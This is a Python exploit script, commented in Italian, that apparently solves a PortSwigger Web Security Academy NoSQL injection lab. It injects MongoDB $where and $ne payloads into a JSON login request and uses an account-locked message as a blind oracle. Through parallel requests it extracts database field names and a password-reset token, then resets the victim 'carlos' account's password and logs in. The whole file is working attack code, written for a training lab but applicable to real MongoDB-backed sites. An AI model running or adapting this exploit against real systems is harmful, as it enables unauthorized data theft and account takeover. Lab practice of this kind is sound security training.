import requests
import sys
import string
import urllib3
import time
import threading
import random
from concurrent.futures import ThreadPoolExecutor
from lxml import html

# Disabilita i warning SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- GESTIONE COLORI ---
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    GREEN = Fore.GREEN
    RED = Fore.RED
    CYAN = Fore.CYAN
    YELLOW = Fore.YELLOW
    WHITE = Fore.WHITE
    RESET = Style.RESET_ALL
    BOLD = Style.BRIGHT
except Exception:
    class Fore: RED = ''; GREEN = ''; YELLOW = ''; BLUE = ''; CYAN = ''; WHITE = ''
    class Style: RESET_ALL = ''; BRIGHT = ''
    GREEN = ''; RED = ''; CYAN = ''; YELLOW = ''; WHITE = ''; RESET = ''; BOLD = ''

def print_error(msg): print(f"{RED}[-] {msg}{RESET}")
def print_success(msg): print(f"{GREEN}[+] {msg}{RESET}")
def print_info(msg): print(f"{CYAN}[*] {msg}{RESET}")

# --- CONFIGURAZIONE UTENTE ---
LAB_ID = "YOUR_LAB_CODE_HERE"  

# --- CONFIGURAZIONE VISUALIZER ---
REFRESH_RATE = 0.05 

class NoSQLMatrixExploit:
    def __init__(self, lab_id):
        self.lab_id = lab_id
        self.base_url = f"https://{lab_id}.web-security-academy.net"
        self.login_url = f"{self.base_url}/login"
        self.forgot_url = f"{self.base_url}/forgot-password"
        
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Mozilla/5.0 (NoSQLi-Solver)"})
        self.session.verify = False 
        
        self.charset = string.ascii_letters + string.digits + "-_!{}"
        self.decrypted_chars = [] 
        self.stop_event = threading.Event()
        self.current_target_desc = "" 

    def check_lab_status(self):
        try:
            r = self.session.get(self.base_url, timeout=10)
            return r.status_code == 200
        except: return False

    def get_csrf_token(self, url):
        try:
            r = self.session.get(url)
            tree = html.fromstring(r.text)
            val = tree.xpath('//input[@name="csrf"]/@value')
            return val[0] if val else None
        except: return None

    # --- NUOVO CONTROLLO XPATH ---
    def check_if_solved(self, response) -> bool:
        """
        Controlla la presenza dell'elemento solved nell'HTML della response tramite XPath.
        """
        try:
            tree = html.fromstring(response.content)
            SOLVED_XPATH = '//*[@id="notification-labsolved"]/div/h4'
            return bool(tree.xpath(SOLVED_XPATH))
        except Exception:
            return False

    def trigger_reset(self):
        try:
            csrf = self.get_csrf_token(self.forgot_url)
            data = {"csrf": csrf, "username": "carlos"}
            r = self.session.post(self.forgot_url, data=data)
            return r.status_code == 200
        except: return False

    def send_injection(self, where_payload):
        headers = {"Content-Type": "application/json"}
        data = {
            "username": "carlos",
            "password": {"$ne": "invalid"},
            "$where": where_payload
        }
        try:
            r = self.session.post(self.login_url, json=data, headers=headers)
            return "Account locked" in r.text
        except: return False

    # --- FASE 1: Field Names ---
    def get_key_length(self, key_index):
        for length in range(1, 25): 
            payload = f"Object.keys(this)[{key_index}].length == {length}"
            if self.send_injection(payload):
                return length
        return None

    def worker_crack_key_char(self, position, key_index):
        shuffled = list(self.charset)
        random.shuffle(shuffled)
        for char in shuffled:
            if self.stop_event.is_set(): break
            if self.decrypted_chars[position] is not None: return
            payload = f"Object.keys(this)[{key_index}].match('^.{{{position}}}{char}.*')"
            if self.send_injection(payload):
                self.decrypted_chars[position] = char
                return

    # --- FASE 2: Field Values ---
    def get_value_length(self, field_name):
        print_info(f"Calcolo lunghezza valore per '{field_name}'...")
        for length in range(1, 100):
            payload = f"this.{field_name}.length == {length}"
            if self.send_injection(payload):
                return length
        return None

    def worker_crack_value_char(self, position, field_name):
        shuffled = list(self.charset)
        random.shuffle(shuffled)
        for char in shuffled:
            if self.stop_event.is_set(): break
            if self.decrypted_chars[position] is not None: return
            payload = f"this.{field_name}.match('^.{{{position}}}{char}.*')"
            if self.send_injection(payload):
                self.decrypted_chars[position] = char
                return

    # --- Visualizer ---
    def visualizer_loop(self, total_len):
        sys.stdout.write("\n")
        while not self.stop_event.is_set():
            display = ""
            found_count = 0
            for i in range(total_len):
                c = self.decrypted_chars[i]
                if c:
                    display += f"{GREEN}{BOLD}{c}{RESET}"
                    found_count += 1
                else:
                    display += f"{WHITE}{random.choice(string.ascii_letters)}{RESET}"
            
            percent = int((found_count/total_len)*100)
            sys.stdout.write(f"\r {YELLOW}>> {self.current_target_desc}:{RESET} [{display}] {percent}%")
            sys.stdout.flush()
            
            if found_count == total_len: break
            time.sleep(REFRESH_RATE)
        sys.stdout.write("\n")

    def run_parallel_attack(self, target_len, worker_func, *args):
        self.decrypted_chars = [None] * target_len
        self.stop_event.clear()
        
        with ThreadPoolExecutor(max_workers=target_len + 2) as executor:
            for i in range(target_len):
                executor.submit(worker_func, i, *args)
            self.visualizer_loop(target_len)
            self.stop_event.set()
        
        return "".join(self.decrypted_chars)

    # ------------------------------------------------------------------
    # MAIN LOGIC
    # ------------------------------------------------------------------
    def run(self):
        if not self.check_lab_status(): 
            print_error("Lab non raggiungibile.")
            return

        print_info("1. Innesco procedura reset per creare la struttura DB...")
        if not self.trigger_reset():
            print_error("Impossibile contattare server.")
            return

        print_info("2. SCANSIONE CAMPI DATABASE (Matrix Mode)...")
        found_fields = {} 
        
        # --- FASE 1: Enumerazione Campi ---
        for i in range(10): 
            sys.stdout.write(f"\r{CYAN}[*] Analisi campo indice {i}...{RESET}")
            sys.stdout.flush()
            
            name_len = self.get_key_length(i)
            if not name_len: break 
                
            self.current_target_desc = f"FIELD NAME [{i}]"
            field_name = self.run_parallel_attack(name_len, self.worker_crack_key_char, i)
            found_fields[i] = field_name
            print_success(f"Trovato campo [{i}]: {field_name}")

        if not found_fields:
            print_error("Nessun campo trovato.")
            return

        # --- FASE 2: Scelta Utente ---
        print("\n" + "="*40)
        print(f"{YELLOW}SELEZIONE MANUALE DEL CAMPO TARGET{RESET}")
        print("I campi trovati nel database sono:")
        for idx, name in found_fields.items():
            print(f"   [{idx}] {GREEN}{name}{RESET}")
        
        print("="*40)
        try:
            choice = int(input(f"{BOLD}Inserisci il numero del campo contenente il token: {RESET}"))
            if choice not in found_fields:
                print_error("Indice non valido.")
                return
            target_field_name = found_fields[choice]
            print_info(f"Target selezionato: {target_field_name}")
        except ValueError:
            print_error("Devi inserire un numero.")
            return

        # --- FASE 3: REFRESH TOKEN ---
        print("\n")
        print_info("Rigenerazione token per evitare scadenza...")
        if not self.trigger_reset():
            print_error("Errore refresh token.")
            return

        # --- FASE 4: Estrazione Token ---
        token_len = self.get_value_length(target_field_name)
        if token_len:
            self.current_target_desc = f"VALUE of {target_field_name}"
            final_token = self.run_parallel_attack(token_len, self.worker_crack_value_char, target_field_name)
            
            print("\n" + f"{GREEN}=========================================={RESET}")
            print(f"{GREEN}{BOLD} TOKEN ESTRATTO: {final_token} {RESET}")
            print(f"{GREEN}=========================================={RESET}\n")
            
            self.perform_takeover(target_field_name, final_token)
        else:
            print_error(f"Il campo {target_field_name} sembra vuoto o non leggibile.")

    def perform_takeover(self, token_name, token_value):
        NEW_PASS = "pwned123"
        print_info(f"Tentativo reset password con token: {token_value}")
        
        # 1. Reset Password
        reset_link = f"{self.forgot_url}?{token_name}={token_value}"
        csrf = self.get_csrf_token(reset_link)
        if not csrf: 
            print_error("Impossibile caricare pagina reset (Token scaduto?).")
            return

        data = {
            "csrf": csrf, "username": "carlos", 
            "new-password-1": NEW_PASS, "new-password-2": NEW_PASS,
            token_name: token_value
        }
        
        # --- DEBUG POST RESET ---
        print("\n" + "="*40)
        print(f"[DEBUG] Invio POST Reset a: {self.forgot_url}")
        print(f"[DEBUG] Dati inviati:\n{data}")
        print("="*40 + "\n")
        
        r_reset = self.session.post(self.forgot_url, data=data)
        
        # --- DEBUG RESPONSE RESET ---
        print("\n" + "="*40)
        print(f"[DEBUG] Status Code Reset: {r_reset.status_code}")
        # Stampiamo i primi 500 caratteri per vedere se c'è un errore evidente
        print(f"[DEBUG] Response Body (anteprima):\n{r_reset.text[:500]}") 
        print("="*40 + "\n")
        
        if r_reset.status_code == 200:
            print_success("Password resettata con successo. Procedo al login...")
            
            # --- 2. LOGIN (Modalità JSON) ---
            # CORREZIONE: L'endpoint login in questo lab si aspetta JSON.
            # Quando si usa JSON, spesso il token CSRF non è richiesto o è gestito diversamente.
            # L'errore "Missing parameter csrf" appariva perché inviavi 'data=' (form) invece di 'json='.
            
            login_data = {
                "username": "carlos", 
                "password": NEW_PASS
            }
            
            print_info(f"Invio Login JSON a: {self.login_url}")
            
            # Usiamo json=login_data invece di data=login_data
            r_login = self.session.post(self.login_url, json=login_data)
            
            print(f"[DEBUG] Status Code Login: {r_login.status_code}")
            
            # --- 3. VERIFICA ---
            # Navighiamo esplicitamente a my-account per verificare la sessione
            account_url = f"{self.base_url}/my-account?id=carlos"
            r_account = self.session.get(account_url)

            # 4. CONTROLLO XPATH SULLA RISPOSTA DELLA PAGINA ACCOUNT
            if self.check_if_solved(r_account):
                print("\n")
                # LAB
                print(f"{GREEN}██╗░░░░░░█████╗░██████╗░{RESET}")
                print(f"{GREEN}██║░░░░░██╔══██╗██╔══██╗{RESET}")
                print(f"{GREEN}██║░░░░░███████║██████╔╝{RESET}")
                print(f"{GREEN}██║░░░░░██╔══██║██╔══██╗{RESET}")
                print(f"{GREEN}███████╗██║░░██║██████╔╝{RESET}")
                print(f"{GREEN}╚══════╝╚═╝░░╚═╝╚═════╝░{RESET}")
                print("") 
                # SOLVED
                print(f"{GREEN}███████╗░█████╗░██╗░░░░░██╗░░░██╗███████╗██████╗░{RESET}")
                print(f"{GREEN}██╔════╝██╔══██╗██║░░░░░██║░░░██║██╔════╝██╔══██╗{RESET}")
                print(f"{GREEN}███████╗██║░░██║██║░░░░░██║░░░██║█████╗░░██║░░██║{RESET}")
                print(f"{GREEN}╚════██║██║░░██║██║░░░░░╚██╗░██╔╝██╔══╝░░██║░░██║{RESET}")
                print(f"{GREEN}███████║╚█████╔╝███████╗░╚████╔╝░███████╗██████╔╝{RESET}")
                print(f"{GREEN}╚══════╝░╚════╝░╚══════╝░░╚═══╝░░╚══════╝╚═════╝░{RESET}")
                
                print("\n" + f"{GREEN}{BOLD} LAB SOLVED! Accesso confermato come Carlos.{RESET}")
                print(f" Credenziali usate: carlos : {NEW_PASS}")
            else:
                # Fallback check
                if "Your username is: carlos" in r_account.text or "My account" in r_account.text:
                     print_success("Accesso riuscito come Carlos (Banner non rilevato, ma sei loggato!).")
                     print(f" Credenziali usate: carlos : {NEW_PASS}")
                else:
                    print_error("Login effettuato ma Banner 'Solved' NON trovato e sessione non confermata.")
                    # Debug extra se il check finale fallisce
                    print(f"[DEBUG] Pagina My Account content (snippet): {r_account.text[:500]}")
        else:
            print_error(f"Cambio password fallito. Status: {r_reset.status_code}")
            
if __name__ == "__main__":
    if "INSERISCI" in LAB_ID:
        print_error("Inserisci il LAB_ID!")
        sys.exit()
    exploit = NoSQLMatrixExploit(LAB_ID)
    exploit.run()
